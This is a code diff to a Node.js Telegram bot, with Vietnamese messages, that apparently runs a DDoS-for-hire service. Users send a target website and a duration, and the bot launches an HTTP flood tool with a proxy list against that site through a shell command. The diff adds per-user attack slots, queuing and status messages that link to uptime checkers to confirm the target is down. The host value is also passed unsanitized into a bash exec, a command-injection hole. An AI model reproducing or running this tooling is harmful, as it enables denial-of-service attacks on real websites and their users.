@@ -7,13 +7,14 @@ const allowedGroupIds = new Set([-1002423723717, 987654321, 112233445, 556677889
 
 const bot = new TelegramBot(token, { polling: true });
 
-const maxSlot = 1; // Số lượng tiến trình đồng thời mỗi người dùng có thể chạy
-const maxCurrent = 3; // Số lượng tiến trình đồng thời toàn bộ hệ thống có thể chạy
-const maxTimeAttacks = 120; // Thời gian tối đa cho mỗi cuộc tấn công (giây)
+const maxSlot = 1;
+const maxCurrent = 3;
+const maxTimeAttacks = 120;
 
 let currentProcesses = 0;
 let queue = [];
 let userProcesses = {};
+let activeAttacks = {};
 
 bot.sendMessage(adminId, '[Version PRO] 🤖 Bot is ready to receive commands.');
 
@@ -33,7 +34,27 @@ bot.on('message', async (msg) => {
             return bot.sendMessage(chatId, `🚫 Thời gian tấn công không được vượt quá ${maxTimeAttacks} giây.`, { parse_mode: 'HTML' });
         }
 
+        // Kiểm tra slot người dùng
+        if (userProcesses[userId] >= maxSlot) {
+            const userAttack = Object.values(activeAttacks).find(a => a.userId === userId);
+            if (userAttack) {
+                const remaining = Math.ceil((userAttack.endTime - Date.now()) / 1000);
+                return bot.sendMessage(chatId, `⛔️ Bạn đang có một tiến trình đang chạy, vui lòng đợi ${remaining} giây còn lại!`);
+            }
+        }
+
+        // Kiểm tra slot hệ thống
+        if (currentProcesses >= maxCurrent) {
+            queue.push({ userId, host, time, chatId, username });
+            return bot.sendMessage(chatId, `⏳ Yêu cầu của bạn đã được đưa vào hàng đợi. Vui lòng chờ...`, { parse_mode: 'HTML' });
+        }
+
         const pid = Math.floor(Math.random() * 10000);
+        const endTime = Date.now() + attackTime * 1000;
+        activeAttacks[pid] = { userId, endTime };
+        userProcesses[userId] = (userProcesses[userId] || 0) + 1;
+        currentProcesses++;
+
         const startMessage = {
             Status: "🚀Successfully🚀",
             Caller: username,
@@ -41,36 +62,51 @@ bot.on('message', async (msg) => {
             Website: host,
             Time: `${time} Giây`,
             Maxslot: maxSlot,
+            Maxtime: maxTimeAttacks,
             ConcurrentAttacks: currentProcesses,
             StartTime: new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' }),
             CheckHostURL: `Check Host (https://check-host.net/check-http?host=${host})`,
             HostTracker: `Host Tracker (https://www.host-tracker.com/en/ic/check-http?url=${host})`
         };
 
-        if (currentProcesses >= maxCurrent || (userProcesses[userId] && userProcesses[userId] >= maxSlot)) {
-            queue.push({ userId, host, time, pid, chatId, username });
-            return bot.sendMessage(chatId, `⏳ Yêu cầu của bạn đã được đưa vào hàng đợi. Vui lòng chờ...`, { parse_mode: 'HTML' });
-        }
-
-        userProcesses[userId] = (userProcesses[userId] || 0) + 1;
-        currentProcesses++;
-
-        await bot.sendMessage(chatId, JSON.stringify(startMessage, null, 2), { parse_mode: 'HTML', reply_markup: { inline_keyboard: [
-            [{ text: 'Check Host', url: `https://check-host.net/check-http?host=${host}` }, { text: 'Host Tracker', url: `https://www.host-tracker.com/en/ic/check-http?url=${host}` }]
-        ]}});
+        await bot.sendMessage(chatId, JSON.stringify(startMessage, null, 2), { 
+            parse_mode: 'HTML', 
+            reply_markup: { 
+                inline_keyboard: [
+                    [
+                        { text: 'Check Host', url: `https://check-host.net/check-http?host=${host}` },
+                        { text: 'Host Tracker', url: `https://www.host-tracker.com/en/ic/check-http?url=${host}` }
+                    ]
+                ]
+            }
+        });
 
         const child = exec(`node ./negan -m GET -u ${host} -p live.txt --full true -s ${time}`, { shell: '/bin/bash' });
         child.on('close', () => {
-            const completeMessage = { Status: "✅Process completed✅", Caller: username, "PID Attack": pid, Website: host, Time: `${time} Giây`, EndTime: new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' }) };
+            const completeMessage = { 
+                Status: "✅Process completed✅", 
+                Caller: username, 
+                "PID Attack": pid, 
+                Website: host, 
+                Time: `${time} Giây`, 
+                EndTime: new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' }) 
+            };
             bot.sendMessage(chatId, JSON.stringify(completeMessage, null, 2), { parse_mode: 'HTML' });
 
+            // Cleanup processes
+            delete activeAttacks[pid];
             userProcesses[userId]--;
             currentProcesses--;
 
+            // Xử lý hàng đợi
             if (queue.length > 0) {
                 const next = queue.shift();
                 bot.sendMessage(next.chatId, `🚀 Bắt đầu tiến trình từ hàng đợi: ${next.host} ${next.time} Giây`, { parse_mode: 'HTML' });
-                bot.emit('message', { chat: { id: next.chatId }, from: { id: next.userId, username: next.username }, text: `${next.host} ${next.time}` });
+                bot.emit('message', { 
+                    chat: { id: next.chatId }, 
+                    from: { id: next.userId, username: next.username }, 
+                    text: `${next.host} ${next.time}` 
+                });
             }
         });
         return;
